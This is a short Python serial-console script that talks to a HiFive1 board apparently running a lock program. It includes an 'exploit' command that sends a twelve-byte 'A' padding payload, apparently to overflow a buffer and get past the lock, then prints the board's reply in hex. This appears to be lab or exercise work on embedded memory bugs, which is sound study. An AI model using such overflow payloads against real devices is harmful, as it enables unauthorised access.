#!/usr/bin/python3
import serial
import sys
from time import sleep
from string import printable


def print_returned_message(received_bytes):
	for byte in received_bytes:
		if chr(byte) in printable:
			print(chr(byte), end="")
		else:
			print(" {} ".format(hex(byte)), end="")
	

def run(): 
	def format_message(message):
		return bytes(message + "\n", "ascii")
	hifive1 = serial.Serial("/dev/ttyUSB1", 9600, timeout=0.1)
	print("waiting until locked")
	while (hifive1.in_waiting < 12):
		sleep(0.1)

	print(hifive1.read(13).decode(), end="")

	while True:
		user_in = input()
		if user_in == "exit":
			sys.exit(0)
		elif user_in == "re-lock":
			return
		
		elif user_in == "exploit":
			hifive1.write(format_message("A"*12 + " ")) # 3 words + 1 byte
			print_returned_message(hifive1.read(500))
			
		else:
			hifive1.write(format_message(user_in))
			print_returned_message(hifive1.read(500))
		

while True: 
	run()
